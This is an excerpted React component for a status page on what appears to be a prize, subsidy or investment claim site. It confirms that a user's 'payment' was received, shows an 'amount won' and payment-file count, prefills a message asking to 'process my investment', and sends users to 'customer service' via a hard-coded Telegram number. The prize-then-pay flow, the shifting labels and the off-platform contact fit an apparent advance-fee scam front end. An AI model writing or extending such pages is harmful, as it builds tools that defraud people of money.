...
function StatusPageContent() {
  ...
  useEffect(() => {
    ...
    const fetchWinner = async () => {
      try {
        const res = await fetch(`/api/winners/${encodeURIComponent(userId)}`);
  ...
  const generateWhatsAppMessage = () => {
    ...
    const message = `INVESTMENT PROCESSING SUBMISSION
📋 PERSONAL INFORMATION:

SUBSIDY DETAILS:
- Investment Type: ${winner.investmentType}
- Investment Name: ${winner.investmentName}
- Investment Amount: $${winner.amountWon.toLocaleString()}
...
- Submission Date: ${winner.claimInfo.submittedAt ? new Date(winner.claimInfo.submittedAt).toLocaleDateString() : 'Not specified'}

📄 PAYMENT CONFIRMATION:
- Files Uploaded: ${winner.claimInfo.paymentFiles?.length || 0}
- Submission Date: ${winner.claimInfo.submittedAt ? new Date(winner.claimInfo.submittedAt).toLocaleDateString() : 'Not specified'}

Process my investment and confirm the next steps. Thank you!`;
...
SUBSIDY DETAILS:
- Invested Amount: $${winner.amountWon.toLocaleString()}
- Payment Method: ${winner.claimInfo.paymentMethod || 'Not specified'}
- Payment Confirmed: ${winner.claimInfo.paymentConfirmedAt ? new Date(winner.claimInfo.paymentConfirmedAt).toLocaleDateString() : 'Not confirmed'}
...
Process my investment and confirm the next steps. Thank you!`;
  ...
  if (!winner || !winner.claimInfo) {
    return (
      <div className="min-h-screen bg-slate-50">
        <main className="mx-auto max-w-2xl px-4 py-16">
          <div className="bg-red-50 border border-red-200 rounded-lg p-4">
            <p className="text-red-800">Status information not found.</p>
          </div>
        </main>
      </div>
    );
    ...
    <div className="min-h-screen bg-slate-50">
      ...
      <main className="mx-auto max-w-4xl px-4 py-8">
        ...
        <div className="text-center mb-8">
          ...
          <h1 className="text-3xl font-bold text-slate-800 mb-2">Payment Confirmation Received!</h1>
          <p className="text-slate-600">Your subsidy application has been successfully submitted and is now being processed.</p>
        </div>
        ...
        <div className="bg-white rounded-xl shadow-sm border border-slate-200 p-6 mb-6">
          ...
          <div className="space-y-2">
            <div>
              <span className="text-sm text-slate-500">Investor Name:</span>
              <p className="text-slate-800 font-medium">{winner.userName || 'Not specified'}</p>
            </div>
            <div>
              <span className="text-sm text-slate-500">Investment Type:</span>
              <p className="text-slate-800 font-medium">{winner.investmentType}</p>
            </div>
            <div>
            ...
            <div>
              ...
              <p className="text-slate-800 font-medium">
                {winner.claimInfo.submittedAt 
                  ...
                  : winner.claimInfo.savedAt 
                    ? new Date(winner.claimInfo.savedAt).toLocaleDateString()
                    : '-'
                }
              </p>
            </div>
            <div>
              ...
              <p className="text-slate-800 font-medium">
                {winner.claimInfo?.paymentFiles?.filter((f: string) => f).length || 0} file(s)
              </p>
            </div>
          </div>
        </div>
        ...
        <div className="bg-emerald-50 border border-emerald-200 rounded-xl p-6">
          ...
          <p className="text-emerald-800 mb-6">
            Go to customer service to proceed with investment confirmation
          </p>
          
          <div className="flex flex-col sm:flex-row gap-4">
            {/* WhatsApp commented out - only Telegram for now */}
            {/* <a
        ...
        <div className="bg-slate-50 border border-slate-200 rounded-xl p-6">
          <h3 className="text-sm font-medium text-slate-700 mb-4">Having trouble with the buttons? Copy our numbers and send us a direct message:</h3>
            ...
            <div className="flex items-center justify-between bg-white rounded-lg p-3 border border-slate-200">
              <div className="flex items-center">
                ...
                <div>
                  ...
                  <p className="text-xs text-slate-500">+1(254)5573308</p>
                </div>
              </div>
              <button
                onClick={() => copyToClipboard('+1(254)5573308', 'telegram')}
                className="px-3 py-1 text-xs bg-slate-100 text-slate-700 rounded hover:bg-slate-200 transition-colors"
              >
